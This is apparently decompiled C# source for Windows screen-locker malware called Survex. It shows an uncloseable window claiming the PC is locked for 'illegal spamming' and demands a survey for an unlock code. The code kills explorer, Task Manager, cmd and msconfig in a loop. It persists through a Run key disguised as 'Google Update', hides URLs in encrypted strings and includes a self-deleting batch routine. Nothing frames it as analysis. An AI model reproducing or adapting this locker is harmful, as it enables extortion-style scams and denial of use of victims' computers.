using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Survex;

public class Form1 : Form
{
	private Thread end;

	private string encpass = "DOFQYYFPCLFD";

	private IContainer components;

	private PictureBox pictureBox1;

	private Label label1;

	private TextBox textBox1;

	private Button button1;

	private Button button2;

	public Form1()
	{
		InitializeComponent();
	}

	public static void Main(string[] args)
	{
		Form val = (Form)(object)new Form1();
		Application.Run(val);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Expected O, but got Unknown
		do
		{
			Application.DoEvents();
		}
		while (!CheckForInternetConnection());
		Thread.Sleep(2000);
		DKWCR();
		OHJLUHZUPLKKYFGVOIVJGVKN();
		Application.DoEvents();
		Process.Start(Decrypt("2TT4y/uy+zxWGpQpRFnYgWBcnZMcmikyd+yseGcYeDQ59I8f67HUDklQjv0aFHmQA2Z/orE43rVEbds/jIso2g==", encpass));
		Application.DoEvents();
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		pictureBox1.set_Image(getIMG(Decrypt("Cm9tGE9QR7IjUtr4+TCIA6cT3iSrNPblWazkyMs5VBnPeyb6/O9X6L+WriMdKaIlWEHVnK6Ozkn31FMtAdyXWg==", encpass)));
		end = new Thread(EndExplorer);
		end.Start();
	}

	[DllImport("user32.dll")]
	public static extern int FindWindow(string lpClassName, string lpWindowName);

	[DllImport("user32.dll")]
	public static extern int SendMessage(int hWnd, uint Msg, int wParam, int lParam);

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool PostMessage(int hWnd, uint Msg, int wParam, int lParam);

	private void EndExplorer()
	{
		try
		{
			int hWnd = FindWindow("Progman", null);
			PostMessage(hWnd, 18u, 0, 0);
			Process.Start("taskkill", "/F /IM explorer.exe");
		}
		catch
		{
		}
		while (true)
		{
			try
			{
				Process[] processes = Process.GetProcesses();
				foreach (Process process in processes)
				{
					if (process.ProcessName.ToLower() == "taskmgr" || process.ProcessName.ToLower() == "explorer" || process.ProcessName.ToLower() == "cmd" || process.ProcessName.ToLower() == "run" || process.ProcessName.ToLower() == "msconfig" || process.ProcessName.ToLower() == "shutdown")
					{
						process.Kill();
					}
				}
			}
			catch
			{
			}
			Thread.Sleep(1000);
		}
	}

	private void OHJLUHZUPLKKYFGVOIVJGVKN()
	{
		try
		{
			Registry.CurrentUser.OpenSubKey(Decrypt("OQABwaKFP6X/uBYMCCzNSW1pcLuQL/VRPTfh6vOg0jsuyCxH5lRnQi/y6NmLKrz1Lr5cDOVihDPXR+DnWhom8ahhxs4nbVcPSNZChUjhT0v0yfWg4w7JRBJp4vakQevu", encpass), writable: true)!.SetValue("Google Update", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void DKWCR()
	{
		StreamWriter streamWriter = new StreamWriter(Application.get_LocalUserAppDataPath() + "\\GoogleUpdate.bat");
		streamWriter.WriteLine("TASKKILL /F /IM " + Application.get_ExecutablePath());
		streamWriter.WriteLine("del " + Application.get_ExecutablePath());
		streamWriter.WriteLine("del " + Application.get_LocalUserAppDataPath() + "\\GoogleUpdate.bat");
		streamWriter.Close();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.FileName = Application.get_LocalUserAppDataPath() + "\\GoogleUpdate.bat";
		Process.Start(processStartInfo);
		Application.Exit();
	}

	public Image getIMG(string sURL)
	{
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Expected O, but got Unknown
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(sURL);
			httpWebRequest.Method = "GET";
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			Bitmap result = new Bitmap(httpWebResponse.GetResponseStream());
			httpWebResponse.Close();
			return (Image)(object)result;
		}
		catch
		{
			return null;
		}
	}

	public static bool CheckForInternetConnection()
	{
		try
		{
			WebClient webClient = new WebClient();
			webClient.DownloadString("http://www.google.com");
			return true;
		}
		catch
		{
			return false;
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void button2_Click(object sender, EventArgs e)
	{
		Process.Start(Decrypt("2TT4y/uy+zxWGpQpRFnYgWBcnZMcmikyd+yseGcYeDQ59I8f67HUDklQjv0aFHmQA2Z/orE43rVEbds/jIso2g==", encpass));
	}

	private void button1_Click(object sender, EventArgs e)
	{
		if (((Control)textBox1).get_Text() == "wgzjqlolgfpe")
		{
			Process.Start("C:\\Windows\\explorer.exe");
			try
			{
				Registry.CurrentUser.OpenSubKey(Decrypt("OQABwaKFP6X/uBYMCCzNSW1pcLuQL/VRPTfh6vOg0jsuyCxH5lRnQi/y6NmLKrz1Lr5cDOVihDPXR+DnWhom8ahhxs4nbVcPSNZChUjhT0v0yfWg4w7JRBJp4vakQevu", encpass), writable: true)!.DeleteValue("Google Update");
			}
			catch
			{
			}
			Environment.Exit(0);
		}
	}

	private string Decrypt(string InputText, string Password)
	{
		try
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			byte[] array = Convert.FromBase64String(InputText);
			byte[] bytes = Encoding.ASCII.GetBytes(Password.Length.ToString());
			PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(Password, bytes);
			ICryptoTransform transform = rijndaelManaged.CreateDecryptor(passwordDeriveBytes.GetBytes(16), passwordDeriveBytes.GetBytes(16));
			MemoryStream memoryStream = new MemoryStream(array);
			CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read);
			byte[] array2 = new byte[array.Length];
			int count = cryptoStream.Read(array2, 0, array2.Length);
			memoryStream.Close();
			cryptoStream.Close();
			return Encoding.Unicode.GetString(array2, 0, count);
		}
		catch
		{
			return InputText;
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		new ComponentResourceManager(typeof(Form1));
		pictureBox1 = new PictureBox();
		label1 = new Label();
		textBox1 = new TextBox();
		button1 = new Button();
		button2 = new Button();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)pictureBox1).set_Location(new Point(12, 12));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(149, 141));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox1.set_TabIndex(0);
		pictureBox1.set_TabStop(false);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(167, 12));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(190, 91));
		((Control)label1).set_TabIndex(1);
		((Control)label1).set_Text("Your computer is supected of illegal \nspamming and has been locked. To\nunlock your computer, prove you are\na human by filling out a survey. After\nyou complete the survey, a download\nwill give you a txt file containing the\ncode needed to unlock your computer.");
		((Control)textBox1).set_Location(new Point(170, 152));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(134, 20));
		((Control)textBox1).set_TabIndex(2);
		((Control)button1).set_Location(new Point(310, 150));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(51, 23));
		((Control)button1).set_TabIndex(3);
		((Control)button1).set_Text("Unlock");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)button2).set_Location(new Point(170, 123));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(75, 23));
		((Control)button2).set_TabIndex(4);
		((Control)button2).set_Text("Survey");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(373, 184));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Your Computer has been Locked");
		((Form)this).set_TopMost(true);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
